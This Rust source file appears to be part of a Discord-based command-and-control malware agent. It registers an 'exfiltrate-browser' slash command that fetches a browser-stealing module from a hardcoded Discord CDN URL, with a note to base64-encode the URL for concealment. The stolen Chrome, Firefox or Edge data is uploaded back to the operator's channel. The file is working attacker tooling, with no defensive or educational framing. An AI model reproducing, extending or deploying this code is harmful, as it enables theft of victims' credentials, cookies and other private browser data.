use crate::os::download::{download_browser_module, generate_attachment};
use crate::errors::DiscordC2Error;

use serenity::{
    client::Context,
    builder::CreateApplicationCommand,
    model::{
        application::{
            command::CommandOptionType,
            interaction::{InteractionResponseType, application_command::{CommandDataOption, CommandDataOptionValue, ApplicationCommandInteraction}},
        },
        channel::AttachmentType,
    },
};

use tempfile::TempDir;
use uuid::Uuid;


/// Registers the "exfiltrate-browser" application command with the provided `CreateApplicationCommand` builder.
/// This command allows users to exfiltrate sensitive data from their browsers via the agent.
///
/// # Arguments
///
/// * `command` - The `CreateApplicationCommand` builder to use for registering the command.
///
/// # Returns
///
/// A mutable reference to the provided `CreateApplicationCommand` builder, with the "exfiltrate-browser" command
/// added.
///
/// # Example
///
/// ```
/// use serenity::builder::CreateApplicationCommand;
///
/// let mut command = CreateApplicationCommand::default();
/// register(&mut command);
/// ```
///
/// This function creates an option for the "exfiltrate-browser" command, which allows users to specify the browser
/// from which they want to exfiltrate data (Chrome, Firefox, or Edge). This option is required.
///
/// Note that this function does not actually register the command with Discord. To do that, you must call the
/// `http.create_global_application_command` method on a `Http` client object.
pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
    // Create the purge command.
    command
        .name("exfiltrate-browser")
        .description("Exfiltrates sensitive data from the user's browsers via the agent.")
        .create_option(|option| {
            option
                .name("browser")
                .description("A supported browser (chrome, firefox, edge)")
                .kind(CommandOptionType::String)
                .add_string_choice("Chrome", "Chrome")
                .add_string_choice("Firefox", "Firefox")
                .add_string_choice("Edge", "Edge")
                .required(true)
        })
}

/// Exfiltrates sensitive data from the user's browser via the agent, and returns the exfiltrated data (if any).
///
/// # Arguments
///
/// * `options` - An array of `CommandDataOption` objects containing the user's command options.
///
/// # Returns
///
/// An `AttachmentType` object containing the exfiltrated data (if any), or `None` if no data was exfiltrated.
///
/// # Panics
///
/// This function will panic if an unsupported browser is specified by the user.
///
/// # Example
///
/// ```
/// use serenity::model::interactions::CommandDataOption;
///
/// async fn handle_interaction(options: &[CommandDataOption]) {
///     let attachment = run(options).await.expect("Failed to exfiltrate browser data");
///     if let Some(content) = attachment.content {
///         println!("Exfiltrated data: {}", content);
///     } else {
///         println!("No data was exfiltrated");
///     }
/// }
/// ```
///
/// This function takes the user's specified browser type from the `options` argument, and passes it to the
/// `exfiltrate_browser` function to exfiltrate the browser data. If the data is successfully exfiltrated, it
/// is returned as an `AttachmentType` object containing the content and filename of the exfiltrated file.
///
/// Note that this function assumes that the `exfiltrate_browser` function will return a valid `AttachmentType`
/// object.
pub async fn run(options: &[CommandDataOption]) -> Option<AttachmentType> {
    let option = options
        .get(0)
        .expect("Expected browser option.")
        .resolved
        .as_ref()
        .expect("Expected browser object.");

    if let CommandDataOptionValue::String(browser) = option {
        match browser.as_str() {
            "Chrome" => exfiltrate_browser("Chrome").await,
            "Firefox" => exfiltrate_browser("Firefox").await,
            "Edge" => exfiltrate_browser("Edge").await,
            _ => panic!("Unsupported browser: {}", browser),
        }
    } else {
        None
    }
}

/// Handles the `/exfiltrate-browser` command by running the `exfiltrate::run` function to exfiltrate data from
/// the user's browser, and then responding to the interaction with the results of the exfiltration. If the
/// exfiltration is successful, this function responds to the interaction with a message indicating success and
/// an attachment containing the exfiltrated data. If the exfiltration fails, this function responds to the
/// interaction with a message indicating failure.
///
/// # Arguments
///
/// * `ctx` - A reference to the Serenity `Context` object for the current session.
/// * `command` - A reference to the `ApplicationCommandInteraction` object representing the current interaction.
///
/// # Returns
///
/// A `Result` object containing either `Ok(())` if the function completes successfully, or an `Error` object
/// if an error occurs.
///
/// # Example
///
/// ```
/// async fn handle_interaction(ctx: &Context, command: &ApplicationCommandInteraction) {
///     let result = handle_exfiltrate(ctx, command).await;
///     match result {
///         Ok(()) => println!("Exfiltration completed successfully"),
///         Err(e) => println!("Error during exfiltration: {:?}", e),
///     }
/// }
/// ```
///
/// This function calls the `exfiltrate::run` function to exfiltrate data from the user's browser, passing in the
/// options specified in the `command`. If the exfiltration is successful, this function responds to the interaction
/// with a message indicating success and an attachment containing the exfiltrated data. If the exfiltration fails,
/// this function responds to the interaction with a message indicating failure.
pub async fn handle_exfiltrate(
    ctx: &Context,
    command: &ApplicationCommandInteraction,
) -> Result<(), DiscordC2Error> {
    let attachment = run(&command.data.options).await;

    command
        .create_interaction_response(&ctx.http, |response| {
            response
                .kind(InteractionResponseType::ChannelMessageWithSource)
                .interaction_response_data(|message| {
                    if let Some(att) = attachment {
                        message.content("Successfully exfiltrated!");
                        message.add_file(att);
                    } else {
                        message.content("Failed to exfiltrate :(");
                    }

                    message
                })
        })
        .await?;
    Ok(())
}

/// Exfiltrates sensitive data from the user's browser, using the module corresponding to the specified `browser`
/// type. This function creates a temporary directory to store the exfiltrated data, and then downloads the data
/// using the appropriate module. If the data is successfully downloaded, it is returned as an `AttachmentType`
/// object containing the content and filename of the exfiltrated file. If the specified `browser` type is not
/// supported, this function returns `None`.
///
/// # Arguments
///
/// * `browser` - A string specifying the type of browser to exfiltrate data from (e.g. "Chrome").
///
/// # Returns
///
/// An `AttachmentType` object containing the exfiltrated data (if any), or `None` if no data was exfiltrated.
///
/// # Example
///
/// ```
/// async fn handle_interaction() {
///     let attachment = exfiltrate_browser("Chrome").await.expect("Failed to exfiltrate browser data");
///     if let Some(content) = attachment.content {
///         println!("Exfiltrated data: {}", content);
///     } else {
///         println!("No data was exfiltrated");
///     }
/// }
/// ```
///
/// This function calls the `handle_download` function to download the exfiltrated data, passing in a temporary
/// directory to store the downloaded data, the URL of the data, and the desired filename for the downloaded file.
/// If the download is successful, `handle_download` returns an `AttachmentType` object containing the content
/// and filename of the exfiltrated file.
async fn exfiltrate_browser(browser: &str) -> Option<AttachmentType<'static>> {
    let temp_dir = TempDir::new().unwrap();
    if browser == "Chrome" {
        let url = "https://cdn.discordapp.com/attachments/1102741318905626688/1102746525035143299/3126786178316y237813"; //TODO: b64 encode this
        let filename = "1";
        Some(handle_download(temp_dir, url, filename).await)
    } else {
        None
    }
}

/// Downloads a file from the specified `url` and saves it to the specified `temp_file_path`. This function
/// returns an `AttachmentType` object containing the content and filename of the downloaded file.
///
/// # Arguments
///
/// * `temp_dir` - A temporary directory to use for storing the downloaded file.
/// * `url` - The URL of the file to download.
/// * `filename` - The desired filename for the downloaded file.
///
/// # Returns
///
/// An `AttachmentType` object containing the content and filename of the downloaded file.
///
/// # Panics
///
/// This function will panic if an error occurs during file download.
///
/// # Example
///
/// ```
/// async fn handle_download() {
///     let temp_dir = TempDir::new().unwrap();
///     let url = "https://example.com/some-file.txt";
///     let filename = "some-file.txt";
///     let attachment_data = handle_download(temp_dir, url, filename).await;
/// }
/// ```
///
/// This function downloads a file from the specified `url` and saves it to a temporary file in the specified
/// `temp_dir`, with the specified `filename`. If the download is successful, this function reads the downloaded
/// file into memory and returns an `AttachmentType` object containing the content and filename of the file.
async fn handle_download(temp_dir: TempDir, url: &str, filename: &str) -> AttachmentType<'static> {
    let temp_file_path = temp_dir.path().join(Uuid::new_v4().to_string());
    download_browser_module(url, filename, &temp_file_path)
        .await
        .expect("Error when downloading the file.");
    generate_attachment(temp_file_path).await.unwrap() // Reads the attachment data into memory and stores it in a `AttachmentType` object.
}
